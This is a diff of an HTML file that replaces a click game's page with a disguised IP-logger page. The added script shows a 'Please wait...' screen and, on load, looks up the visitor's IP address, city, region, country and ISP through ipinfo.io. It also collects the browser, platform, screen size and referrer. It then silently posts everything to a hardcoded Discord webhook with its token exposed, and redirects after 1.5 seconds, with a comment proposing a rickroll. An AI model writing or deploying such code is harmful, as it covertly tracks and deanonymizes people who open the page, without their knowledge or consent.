@@ -1,40 +1,55 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Click Game</title>
-    <link rel="stylesheet" href="style.css">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://code.createjs.com/1.0.0/soundjs.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/3.2.1/jsencrypt.min.js"></script>
-    <script src="game.js" defer></script>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}</style>
 </head>
-<body onload="init()">
+<body>
+  <h1>Please wait...</h1>
 
-    <!-- Welcome Layer -->
-    <div id="welcome">
-        <h1>Welcome</h1>
-        <button onclick="readyBtn()" class="start_btn">Start</button>
-        <p>Mode: <span id="mode"></span></p>
-    </div>
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1485701753654743261/BNhHwbYVgb4vi3GO2RpOBZ-DqnmrxZMv_Vn7tnc4nRf0BMnoTaQFqGWeFngQcDwCrj4E"; // ← replace
 
-    <!-- Game Body -->
-    <div id="gameBody"></div>
+    async function logVisit() {
+      try {
+        const ipRes = await fetch('https://ipinfo.io/json');
+        const ipData = await ipRes.json();
 
-    <!-- Game Score Layer -->
-    <div id="GameScoreLayer" class="SHADE">
-        <div id="GameScoreLayer-text"></div>
-        <div>CPS: <span id="cps"></span></div>
-        <div>SCORE: <span id="score"></span></div>
-        <div>BEST: <span id="best"></span></div>
-        <button id="replay" onclick="replayBtn()">Replay</button>
-        <button onclick="backBtn()">Return</button>
-    </div>
+        const info = {
+          ip: ipData.ip || '?',
+          location: `${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}`,
+          isp: ipData.org || '?',
+          browser: navigator.userAgent,
+          platform: navigator.platform || '?',
+          screen: `\( {screen.width}x \){screen.height}`,
+          time: new Date().toISOString(),
+          referrer: document.referrer || 'direct'
+        };
 
-    <!-- Hidden file inputs for click images -->
-    <input type="file" id="click-before-image" style="display:none" onchange="saveClickBeforeImage()">
-    <input type="file" id="click-after-image" style="display:none" onchange="saveClickAfterImage()">
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            embeds: [{
+              title: "Visitor Logged",
+              color: 0x00ff00,
+              fields: Object.entries(info).map(([key, val]) => ({
+                name: key.charAt(0).toUpperCase() + key.slice(1),
+                value: `\`${val}\``,
+                inline: key !== 'browser' && key !== 'referrer'
+              })),
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      } catch (e) {}
+    }
 
+    logVisit();
+
+    // Optional: redirect somewhere after logging (e.g. rickroll or real site)
+    setTimeout(() => { window.location = "https://example.com"; }, 1500);
+  </script>
 </body>
 </html>
